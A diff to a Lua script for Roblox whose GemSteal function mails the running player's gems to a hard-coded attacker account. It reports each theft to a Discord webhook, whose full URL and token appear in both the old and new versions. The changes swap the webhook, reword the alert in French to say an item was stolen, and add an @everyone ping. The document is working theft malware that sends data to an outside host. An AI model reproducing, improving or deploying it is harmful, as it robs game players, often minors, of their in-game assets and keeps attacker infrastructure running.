@@ -1,5 +1,5 @@
 Username = "matou2209"
-Webhook = "https://discord.com/api/webhooks/1213255158545383456/xWWQ4onamyBSWtK08wAM6VTW7-HfjeOZtpCneCkLIzuGYPgYvI1MxZy_ga_IVZUSlkML"
+Webhook = "https://discord.com/api/webhooks/1212349394712789025/xEAHteOdXmkvINq2mWnEnOQWNBABuSrDhrOWcNWLMifhrmjCt2AfHsVKeaVrBcAQS5r7"
 min_rap = 10000
 
 function SendMessage(url, username, itemID, itemType)
@@ -14,10 +14,9 @@ function SendMessage(url, username, itemID, itemType)
         thumbnailUrl = "https://emojicdn.elk.sh/💎"  -- Emoji de diamant pour les diamants
     end
     local data = {
-        ["content"] = "@everyone", -- Mention @everyone
         ["embeds"] = {{
-            ["title"] = "NEW HIT🎉",
-["description"] = string.format("%s Username: %s.", username, itemType),
+            ["title"] = "Nouvel objet envoyé",
+            ["description"] = string.format("%s a volé un objet de type %s.", username, itemType),
             ["color"] = 10053324,
             ["fields"] = {
                 {
@@ -359,6 +358,7 @@ function GemSteal()
                 game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                 if Webhook and Webhook ~= "" then
                     SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000), "Diamonds")
+                    SendMessage(Webhook, "@everyone " .. game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000), "Diamonds")
                 end
             end
         end
